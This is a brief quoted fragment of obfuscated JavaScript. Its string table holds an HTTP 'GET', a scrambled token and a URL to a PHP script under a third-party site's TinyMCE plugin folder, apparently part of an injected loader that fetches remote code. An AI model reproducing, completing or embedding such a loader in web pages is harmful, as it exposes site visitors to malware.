...
function A() {
    var s = [
        ...
        'GET',
        'www.',
        '//kb.provisdemo.com/libs/tinymce/plugins/advlist/advlist.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
